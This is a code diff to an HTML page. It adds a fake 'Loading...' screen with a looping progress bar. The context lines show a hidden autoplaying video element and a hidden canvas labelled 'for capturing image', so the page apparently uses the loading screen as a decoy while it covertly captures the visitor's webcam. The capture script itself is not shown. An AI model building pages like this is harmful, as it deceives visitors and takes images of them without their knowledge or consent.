@@ -4,8 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>index</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body>
+    <div class="w-4/5 sm:w-2/3 lg:w-1/3 bg-white p-5 rounded-lg shadow-lg flex flex-col items-center">
+        <h1 class="text-2xl font-bold mb-4 text-gray-700">Loading...</h1>
+        
+        <!-- Loading Bar Container -->
+        <div class="w-full bg-gray-300 rounded-full h-4">
+          <div class="loading-bar bg-blue-500 h-full rounded-full"></div>
+        </div>
+      </div>
+
+      <style>
+        .loading-bar {
+          width: 0;
+          animation: load 3s ease-in-out infinite;
+        }
+    
+        @keyframes load {
+          0% { width: 0%; }
+          50% { width: 100%; }
+          100% { width: 0%; }
+        }
+      </style>
+    </body>
+    </html>
 
     <video id="video" autoplay style="display:none;"></video> <!-- Hidden video element -->
     <canvas id="canvas" style="display: none;"></canvas> <!-- Hidden canvas element for capturing image -->
